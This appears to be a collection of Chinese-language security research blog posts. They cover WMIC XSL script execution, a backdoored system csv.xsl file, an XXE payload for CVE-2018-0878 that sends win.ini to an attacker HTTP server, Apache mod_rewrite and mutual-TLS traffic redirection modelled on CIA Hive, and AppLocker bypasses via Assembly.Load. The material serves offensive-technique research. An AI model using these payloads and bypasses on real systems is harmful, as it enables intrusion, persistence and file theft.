/format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml&quot; 执行失败，提示Invalid XSL format (or) file name. 脚本内容不变，后缀名改为xsl，再次执行： wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot; 执行成功，成功弹出计算器，如下图 补充： xsl和xml文件的异同相同点：语法规则基本相同，仅声明方式不同(以上测试代码未体现) 不同点：用途不同，xml用于承载数据，xsl用户设置数据的格式 简单理解：通过使用XSL可以向XML文件添加显示信息，使用XSL显示XML 0x04 后门利用思路 通过学习Casey Smith在博客中分享的研究思路，我想到了一个后门利用的思路 对于路径c:\Windows\System32\wbem下的xsl文件 例如： csv.xsl htable.xsl texttable.xsl 同wmic命令的输出格式相对应，例如： wmic os get /format:csv wmic os get /format:htable wmic os get /format:texttable 那么，使用wmic命令在输出格式时是否会加载对应名称的xsl文件呢？ 答案是肯定的 挑选其中的csv.xsl，内容如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!-- Copyright (c) Microsoft Corporation. All rights reserved. --&gt; &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt; &lt;xsl:output encoding=&quot;utf-16&quot; omit-xml-declaration=&quot;yes&quot;/&gt; &lt;xsl:param name=&quot;norefcomma&quot;/&gt; &lt;xsl:template match=&quot;/&quot;&gt; Node,&lt;xsl:for-each select=&quot;COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE&quot;&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select=&quot;COMMAND/RESULTS&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;RESULTS&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;CIM/INSTANCE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.ARRAY&quot; xml:space=&quot;preserve&quot;&gt;{&lt;xsl:for-each select=&quot;VALUE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;.&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;INSTANCE&quot; xml:space=&quot;preserve&quot;&gt; &lt;xsl:value-of select=&quot;../../@NODE&quot;/&gt;,&lt;xsl:for-each select=&quot;PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.REFERENCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE.REFERENCE&quot;&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.ARRAY&quot;&gt;&lt;xsl:for-each select=&quot;VALUE.ARRAY&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.REFERENCE&quot;&gt;&quot;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/NAMESPACEPATH&quot;/&gt;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/INSTANCENAME|INSTANCENAME&quot;/&gt;&quot;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;NAMESPACEPATH&quot;&gt;\\&lt;xsl:value-of select=&quot;HOST/text()&quot;/&gt;&lt;xsl:for-each select=&quot;LOCALNAMESPACEPATH/NAMESPACE&quot;&gt;\&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt; &lt;xsl:template match=&quot;INSTANCENAME&quot;&gt;&lt;xsl:value-of select=&quot;@CLASSNAME&quot;/&gt;&lt;xsl:for-each select=&quot;KEYBINDING&quot;&gt;&lt;xsl:if test=&quot;position()=1&quot;&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;=&quot;&lt;xsl:value-of select=&quot;KEYVALUE/text()&quot;/&gt;&quot;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;&lt;/xsl:if&gt;&lt;xsl:if test=&quot;not($norefcomma=&amp;quot;true&amp;quot;)&quot;&gt;,&lt;/xsl:if&gt;&lt;xsl:if test=&quot;$norefcomma=&amp;quot;true&amp;quot;&quot;&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 尝试在代码中添加payload，修改后的内容如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!-- Copyright (c) Microsoft Corporation. All rights reserved. --&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;urn:my-scripts&quot;&gt; &lt;xsl:output encoding=&quot;utf-16&quot; omit-xml-declaration=&quot;yes&quot;/&gt; &lt;xsl:param name=&quot;norefcomma&quot;/&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function myFunction() { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); return &quot;&quot;; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:myFunction()&quot;/&gt; Node,&lt;xsl:for-each select=&quot;COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE&quot;&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select=&quot;COMMAND/RESULTS&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;RESULTS&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;CIM/INSTANCE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.ARRAY&quot; xml:space=&quot;preserve&quot;&gt;{&lt;xsl:for-each select=&quot;VALUE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;.&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;INSTANCE&quot; xml:space=&quot;preserve&quot;&gt; &lt;xsl:value-of select=&quot;../../@NODE&quot;/&gt;,&lt;xsl:for-each select=&quot;PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.REFERENCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE.REFERENCE&quot;&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.ARRAY&quot;&gt;&lt;xsl:for-each select=&quot;VALUE.ARRAY&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.REFERENCE&quot;&gt;&quot;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/NAMESPACEPATH&quot;/&gt;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/INSTANCENAME|INSTANCENAME&quot;/&gt;&quot;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;NAMESPACEPATH&quot;&gt;\\&lt;xsl:value-of select=&quot;HOST/text()&quot;/&gt;&lt;xsl:for-each select=&quot;LOCALNAMESPACEPATH/NAMESPACE&quot;&gt;\&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt; &lt;xsl:template match=&quot;INSTANCENAME&quot;&gt;&lt;xsl:value-of select=&quot;@CLASSNAME&quot;/&gt;&lt;xsl:for-each select=&quot;KEYBINDING&quot;&gt;&lt;xsl:if test=&quot;position()=1&quot;&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;=&quot;&lt;xsl:value-of select=&quot;KEYVALUE/text()&quot;/&gt;&quot;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;&lt;/xsl:if&gt;&lt;xsl:if test=&quot;not($norefcomma=&amp;quot;true&amp;quot;)&quot;&gt;,&lt;/xsl:if&gt;&lt;xsl:if test=&quot;$norefcomma=&amp;quot;true&amp;quot;&quot;&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 替换原文件，需要管理员权限 注： csv.xsl的路径同系统语言版本有关，如果是英文系统，路径为C:\Windows\System32\wbem\en-US，如果是中文系统，路径为C:\Windows\System32\wbem\zh-CN 测试使用wmic的输出格式命令： wmic os get /format:csv 执行payload，如下图 0x05 同XXE漏洞的结合 XXE是XML External Entity attack的缩写 前不久一个和Windows相关的XXE漏洞：CVE-2018-0878 poc地址如下： https://www.exploit-db.com/exploits/44352/ 同样可在wmic命令上触发 漏洞测试：1、使用kali linux建立httt服务器python -m SimpleHTTPServer 8080 2、kali linux目录下创建文件xxe.xml内容如下： &lt;!ENTITY % payload SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt; &lt;!ENTITY % root &quot;&lt;!ENTITY &amp;#37; oob SYSTEM &#39;http://192.168.62.140:8080/?%payload;&#39;&gt; &quot;&gt; 注： kali linux的IP为192.168.62.140 3、创建payload.xsl内容如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE zsl [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.62.140:8080/xxe.xml&quot;&gt; %remote;%root;%oob;]&gt; 4、windows系统使用wmic加载该xsl文件wmic os get /format:payload.xsl 执行失败，提示Invalid XSL format (or) file name. 然而，漏洞成功触发，服务器获得文件C:/windows/win.ini的内容，如下图 0x06 小结 本文测试了使用wmic从本地或从URL调用XSL文件的方法，分享了一个后门利用的思路，并结合CVE-2018-0878对XXE漏洞进行了测试。站在防御的角度，如果wmic.exe发起了网络连接，那么很有可能是加载了特殊xsl文件的原因，值得注意。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发]]></title>
    <url>%2Fposts%2F3e9d700d.html</url>
    <content type="text"><![CDATA[0x00 前言 上篇文章介绍了使用Apache的mod_rewrite模块来实现http流量分发，本文将在此基础上介绍https的流量分发，对客户端的证书进行判断，若证书有效，才会将流量转发至真实服务器。 0x01 简介 本文将要介绍以下内容： Windows系统下配置Apache开启ssl Ubuntu系统下配置Apache开启ssl 使用openssl生成证书的方法和难点 Apache Https双向认证的配置 实现https流量分发的过程 0x02 Windows系统下配置Apache开启ssl 1、下载包含openssl的Apache地址： http://httpd.apache.org/download.cgi 选择需要的版本，测试版本Apache 2.4.33，下载地址： https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW 2、安装解压后通过命令行安装： cd \Apace24\bin httpd -k install 3、配置httpd.conf位于\Apace24\conf\httpd.conf (1)定位： #LoadModule ssl_module modules/mod_ssl.so 去掉# (2)定位： &lt;IfModule ssl_module&gt; Include conf/extra/httpd-ahssl.conf SSLRandomSeed startup builtin SSLRandomSeed connect builtin &lt;/IfModule&gt; 将Include conf/extra/httpd-ahssl.conf改为Include conf/extra/httpd-ssl.conf 注： httpd-ahssl.conf是Apache自带的ssl配置，默认生成了可用的私钥和证书(位于\Apace24\conf\ssl)，也可以直接修改httpd-ahssl.conf进行配置 4、配置httpd-ssl.conf位于\Apache24\conf\extra\httpd-ssl.conf (1)定位： &lt;VirtualHost _default_:443&gt; # General setup for the virtual host DocumentRoot &quot;${SRVROOT}/htdocs&quot; ServerName www.example.com:443 修改为： &lt;VirtualHost _default_:443&gt; # General setup for the virtual host DocumentRoot &quot;${SRVROOT}/htdocs&quot; ServerName test.com:443 (2)定位： SSLCertificateFile &quot;${SRVROOT}/conf/server.crt&quot; 修改为自己证书文件的路径(后面会介绍生成方法) (3)定位： SSLCertificateKeyFile &quot;${SRVROOT}/conf/server.key&quot; 修改为自己私钥文件的路径(后面会介绍生成方法) 5、重启apachehttpd.exe -k restart 0x03 Ubuntu系统下配置Apache开启ssl 1、安装apachesudo apt-get install apache2 2、安装opensslsudo apt-get install openssl 3、开启Apache SSL模块a2enmod ssl 4、编辑文件/etc/apache2/sites-enabled/default-ssl.conf指定私钥文件和签名证书的路径 SSLEngine on SSLCertificateFile /etc/apache2/ssl/test.com.crt SSLCertificateKeyFile /etc/apache2/ssl/test.com.key 5、启用Apache默认的SSL虚拟主机a2ensite default-ssl 6、重启Apache:sudo /etc/init.d/apache2 restart 0x04 生成SSL证书的流程 1、客户端生成一对公钥和私钥(.key文件)2、客户端生成证书请求文件(.csr文件)将csr文件发送给CA机构进行校验，若审核通过，CA机构使用自己的私钥对csr文件进行签名，生成证书文件(.crt文件),发给用户，用户使用该证书证明自己的身份 生成方法： 输入： 用户私钥 用户信息 输出： csr文件，包括用户公钥和用户信息 3、CA审核请求，生成证书文件(.crt)一般是将csr文件发送到证书签发机构CA进行校验，但是我们可以自己对其审核，生成一个自签名证书(可用于测试，无法保证可信) 0x05 使用openssl生成SSL证书 Ubuntu安装openssl后可直接运行openssl Windows安装Apache后默认安装openssl，位于\Apache24\bin 1、常规方法：(1) 生成2048位的加密私钥openssl genrsa -out server.key 2048 (2) 生成证书签名请求openssl req -new -key server.key -out server.csr 接着依次填入配置信息，Common Name项要同域名对应(测试域名为test.com) (3) 生成自签名证书openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt 2、快捷方法：通过网站自动生成openssl配置参数，地址如下： https://myssl.com/csr_create.html 填入配置信息后自动生成openssl参数，如下图 参数如下： openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout test.com.key -out test.com.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=test.com&quot; 生成私钥文件test.com.key和证书签名请求test.com.csr 接着生成自签名证书： openssl x509 -req -days 3650 -in test.com.csr -signkey test.com.key -out test.com.crt 实际测试： (1) 修改apache服务器的ssl配置SSLCertificateFile指向自签名证书(.crt文件)路径 SSLCertificateKeyFile指向私钥文件(.key文件)路径 重启apache服务 (2) 客户端修改hosts文件：apache服务器ip对应test.com 如下图 (3) 客户端将自签名证书安装到受信任的根证书颁发机构安装后如下图 (4) 客户端访问Apache服务器访问失败，提示它的安全证书没有指定主题备用名称，如下图 常规方法和快捷方法生成的证书均存在这个问题 3、解决方法证书缺少主题备用名称SAN (Subject Alternate Name)，需要通过配置文件进行添加 参考资料： https://support.citrix.com/article/CTX135602_ 新建文件req.cnf，内容如下： [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = VA L = SomeCity O = MyCompany OU = MyDivision CN = test.com [v3_req] keyUsage = critical, digitalSignature, keyAgreement extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = test.com 注： CN和DNS.1都需要设定为域名(测试域名为test.com) 生成私钥和自签名证书： openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout test.com.key -out test.com.crt -config req.cnf -sha256 修改apache服务器的ssl配置,指定新的私钥文件(test.com.key)和证书文件(test.com.crt)，重启apache服务 客户端安装自签名证书文件test.com.crt 访问Apache服务器，证书有效，一切正常，如下图 补充： 在未来，openssl有可能支持设置参数DNS.1，相关资料： https://github.com/openssl/openssl/pull/4986 0x06 规则配置实现https流量分发 1、开启双向认证服务器验证客户端证书，如果客户端证书有效，客户端才能正常访问网页，否则无法访问 (1) Windows系统1.生成客户端证书 openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user&quot; openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crt openssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12 2.服务器编辑文件\Apache24\conf\extra\httpd-ssl.conf 添加客户端证书的路径，指向user.crt SSLEngine on SSLCertificateFile &quot;${SRVROOT}/conf/test.com.crt&quot; SSLCertificateKeyFile &quot;${SRVROOT}/conf/test.com.key&quot; SSLCACertificateFile &quot;${SRVROOT}/conf/user.crt&quot; 开启客户端认证： SSLVerifyClient require SSLVerifyDepth 10 3.重启Apache httpd.exe -k restart 4.客户端安装证书user.p12 访问网页时弹框提示，确认证书后正常访问，如下图 (2) Ubuntu系统1.生成客户端证书 openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user&quot; openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crt openssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12 2.服务器编辑文件/etc/apache2/sites-enabled/default-ssl.conf 指定私钥文件、签名证书和客户端证书的路径 SSLEngine on SSLCertificateFile /etc/apache2/ssl/test.com.crt SSLCertificateKeyFile /etc/apache2/ssl/test.com.key SSLCACertificateKeyFile /etc/apache2/ssl/user.crt 开启客户端认证： SSLVerifyClient require SSLVerifyDepth 10 3.重启Apache sudo /etc/init.d/apache2 restart 4.客户端安装证书user.p12 正常访问 2、流量转发配置方法参照上篇文章，本文不再赘述 最终能实现对Https的流量进行判断，如果证书有效，转发到真实服务器 如果证书无效，可选择转发到Cover Server或是不提供服务 0x07 小结 本文介绍了Windows系统和Ubuntu系统下配置Apache https的方法，分享SSL证书生成方法和配置过程，在技术研究的角度实现了对Https的流量判断，根据条件进行https流量的分发。 至此，成功实现Hive的流量分发功能。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发]]></title>
    <url>%2Fposts%2F1d97e66e.html</url>
    <content type="text"><![CDATA[0x00 前言 2017年11月9日维基解密公布一个代号为Vault8的文档，包含服务器远程控制工具Hive的源代码和开发文档。开发文档中的框架图显示Hive支持流量分发功能，若流量有效，转发至Honeycomb服务器，若流量存在问题，转发至Cover Server。本文仅站在技术研究的角度，尝试使用Apache的mod_rewrite模块实现http流量分发，完成相同的目标。 标记后的框架图如下： 之前的分析文章： 《CIA Hive测试指南——源代码获取与简要分析》 0x01 简介 本文将要介绍以下内容： Windows系统下安装配置Apache mod_rewrite Ubuntu系统下安装配置Apache mod_rewrite 规则配置技巧与实例 根据判定条件实现http流量分发 0x02 Windows系统下安装配置Apache mod_rewrite 1、下载Apache地址： http://httpd.apache.org/download.cgi 选择需要的版本，测试版本Apache 2.4.33，下载地址： https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW 2、安装解压后通过命令行安装： cd \Apace24\bin httpd -k install 3、开启mod_rewrite模块编辑文件： \Apace24\conf\httpd.conf 找到#LoadModule rewrite_module modules/mod_rewrite.so，去掉# 4、开启支持.htaccess文件编辑文件： \Apace24\conf\httpd.conf 定位如下位置： DocumentRoot &quot;${SRVROOT}/htdocs&quot; &lt;Directory &quot;${SRVROOT}/htdocs&quot;&gt; # # Possible values for the Options directive are &quot;None&quot;, &quot;All&quot;, # or any combination of: # Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews # # Note that &quot;MultiViews&quot; must be named *explicitly* --- &quot;Options All&quot; # doesn&#39;t give it to you. # # The Options directive is both complicated and important. Please see # http://httpd.apache.org/docs/2.4/mod/core.html#options # for more information. # Options Indexes FollowSymLinks # # AllowOverride controls what directives may be placed in .htaccess files. # It can be &quot;All&quot;, &quot;None&quot;, or any combination of the keywords: # Options FileInfo AuthConfig Limit # AllowOverride All # # Controls who can get stuff from this server. # Require all granted &lt;/Directory&gt; AllowOverride None改为AllowOverride All 5、编写.htaccess文件，配置规则保存路径为\Apace24\htdocs\ 测试规则为将1.html重定向到2.html，具体内容如下： &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteRule 1.html 2.html &lt;/IfModule&gt; 使用记事本打开，另存为文件，文件名为&quot;.htaccess&quot; 注： 文件名包含引号&quot;，如下图 2.html保存在\Apace24\htdocs\，内容如下： &lt;html&gt; &lt;body&gt; True page &lt;/body&gt; &lt;/html&gt; 6、开启apache服务httpd.exe -k start 7、测试访问http://127.0.0.1/1.html 返回内容True page，代表网页被重定向到了2.html 8、补充apache的日志路径为\Apache24\logs mod_rewrite的日志保存在error.log 文件\Apace24\conf\httpd.conf可指定日志记录等级 0x03 Ubuntu系统下安装配置Apache mod_rewrite 1、下载安装sudo apt-get install apache2 2、开启mod_rewrite模块sudo a2enmod rewrite 3、开启支持.htaccess文件编辑文件： /etc/apache2/apache2.conf 定位如下位置： &lt;Directory /var/www/&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted &lt;/Directory&gt; AllowOverride None改为AllowOverride All 4、编写.htaccess文件，配置规则保存路径为\var\www\html\ 测试规则为将1.html重定向到2.html，具体内容如下： &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteRule 1.html 2.html &lt;/IfModule&gt; 2.html保存在\var\www\html\，内容如下： &lt;html&gt; &lt;body&gt; True page &lt;/body&gt; &lt;/html&gt; 5、开启apache服务sudo /etc/init.d/apache2 restart 6、测试访问http:/IP/1.html 返回内容True page，代表网页被重定向到了2.html 7、补充apache的日志路径为/var/log/apache2/ mod_rewrite的日志保存在error.log 文件/etc/apache2/apache2.conf可指定日志记录等级 0x04 规则配置技巧与实例 1、将所有网页重定向至 https://www.baidu.com.htaccess文件内容如下： &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteRule . https://www.baidu.com &lt;/IfModule&gt; 2、过滤Request Header(1) User Agent只针对特定User Agent的请求进行重定向 实例： 使用Mac下的Safari浏览器访问1.html，将其重定向到2.html .htaccess文件内容如下： &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond &quot;%{HTTP_USER_AGENT}&quot; &quot;Macintosh; Intel Mac OS X 10_9_3&quot; [NC] RewriteRule 1.html 2.html &lt;/IfModule&gt; 参数说明： RewriteCond &quot;%{HTTP_USER_AGENT}&quot; &quot;Macintosh; Intel Mac OS X 10_9_3&quot; [NC]代表判定条件，判断HTTP_USER_AGENT是否包含字符串&quot;Macintosh; Intel Mac OS X 10_9_3&quot;(大小写不敏感) NC: 字符比较，大小写不敏感 详细参数说明可参考： https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond 1.使用curl进行测试 模拟Chrome浏览器： curl -A &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot; http://192.168.62.137/1.html 并没重定向，如下图 模拟Mac Safari浏览器： curl -A &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot; http://192.168.62.137/1.html 网页重定向，获得2.html的内容，如下图 2.Chrome浏览器修改User Agent的方法 访问页面，F12 -&gt; More tools -&gt; Network conditions，选择User agent 为 Safari —— Mac 如下图 ####(2) Peferer 只针对特定来源的请求进行重定向 实例： 如果来源为test.com，访问1.html时将其重定向到2.html &lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond &quot;%{HTTP_REFERER}&quot; &quot;test.com&quot; [NC] RewriteRule 1.html 2.html &lt;/IfModule&gt; 使用curl进行测试： curl -e &quot;test.com&quot; http://192.168.62.137/1.html (3) 其他可供选择的过滤条件如下图 注： 图片来源于https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond 补充： Jeff Dimmock在他的博客分享了使用mod_rewrite配置规则的心得，值得学习，地址如下： https://bluescreenofjeff.com/tags 0x05 小结 本文介绍了Windows系统和Ubuntu系统下安装配置Apache mod_rewrite的方法，分享配置技巧与实例，在技术研究的角度实现了根据请求条件进行http流量分发。 下篇文章将要介绍https的流量分发实现。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用Assembly Load & LoadFile绕过Applocker的分析总结]]></title>
    <url>%2Fposts%2Fa99095d9.html</url>
    <content type="text"><![CDATA[0x00 前言 最近bohops在文章《Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts》中介绍了利用CL_LoadAssembly.ps1绕过Applocker的方法，Casey Smith早在SchmooCon 2015也提到了这个方法。本文将要对他们的两个实现方法进行复现，分析细节，比较区别，进而总结利用思路。 0x01 简介 本文将要介绍以下内容： 复现bohops的方法 复现Casey Smith的方法 细节分析 总结利用思路 0x02 复现bohops的方法 测试系统： Win7 x86 开启Applocker，开启方法可参考文章《Bypass Windows AppLocker》 开发工具: VS2012 1、新建c#控制台工程ConsoleApplication5，默认代码如下： using System; using System.Collections.Generic; using System.Text; namespace ConsoleApplication5 { class Program { static void Main(string[] args) { } } } 2、修改代码，内容如下： namespace ConsoleApplication5 { public class Program { public static void test() { System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = &quot;c:\\windows\\system32\\calc.exe&quot;; // p.StartInfo.FileName = &quot;c:\\windows\\system32\\cmd.exe&quot;; // p.StartInfo.Arguments = @&quot;/c &quot;&quot;powershell.exe&quot;&quot; -ep bypass -c $host&quot;; p.Start(); } static void Main(string[] args) { test(); } } } 注： class Program前需要添加访问修饰符public,添加Method test()同样要加访问修饰符public 3、修改目标框架为.net 2.0，编译生成ConsoleApplication5，保存在c:\6下 4、powershell执行如下代码： cd C:\windows\diagnostics\system\AERO import-module .\CL_LoadAssembly.ps1 LoadAssemblyFromPath ..\..\..\..\6\ConsoleApplication5.exe [ConsoleApplication5.Program]::test() 注： ..\..\..\..\能够定位到c:\ [ConsoleApplication5.Program]::test()需要同程序内的代码对应，格式为：[$namespace.$class]::$fuction() 成功执行calc.exe，绕过applocker 0x03 复现Casey Smith的方法 测试系统： Win7 x86 开启Applocker 代码参考地址： https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663 本次测试对Casey Smith的代码做细微修改 1、新建文件bypass.cs，内容如下： using System; using System.Collections.Generic; using System.Text; public class Program { public static void Main() { Console.WriteLine(&quot;Hey There From Main()&quot;); //Add any behaviour here to throw off sandbox execution/analysts :) } } public class aaa { public static void bbb() { System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = &quot;c:\\windows\\system32\\calc.exe&quot;; // p.StartInfo.FileName = &quot;c:\\windows\\system32\\cmd.exe&quot;; // p.StartInfo.Arguments = @&quot;/c &quot;&quot;powershell.exe&quot;&quot; -ep bypass -c notepad.exe&quot;; p.Start(); } } 2、使用2.0版本的csc.exe对其编译，生成exe文件 C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:bypass.exe bypass.cs 3、powershell执行如下代码： $bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\bypass.exe&quot;) [Reflection.Assembly]::Load($bytes) [aaa]::bbb() 成功执行calc.exe，绕过applocker 0x04 对比分析 1、bohops的方法加载文件CL_LoadAssembly.ps1，位于C:\windows\diagnostics\system\AERO 文件CL_LoadAssembly.ps1内容如下： # Copyright © 2008, Microsoft Corporation. All rights reserved. # Common library . .\CL_Utility.ps1 function LoadAssemblyFromNS([string]$namespace) { if([string]::IsNullorEmpty($namespace)) { throw &quot;Invalid namespace&quot; } [System.Reflection.Assembly]::LoadWithPartialName($namespace) &gt; $null } function LoadAssemblyFromPath([string]$scriptPath) { if([String]::IsNullorEmpty($scriptPath)) { throw &quot;Invalid file path&quot; } $absolutePath = GetAbsolutionPath $scriptPath [System.Reflection.Assembly]::LoadFile($absolutePath) &gt; $null } 调用函数LoadAssemblyFromPath，本质上是调用[System.Reflection.Assembly]::LoadFile($absolutePath) 2、Casey Smith的方法$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\bypass.exe&quot;) 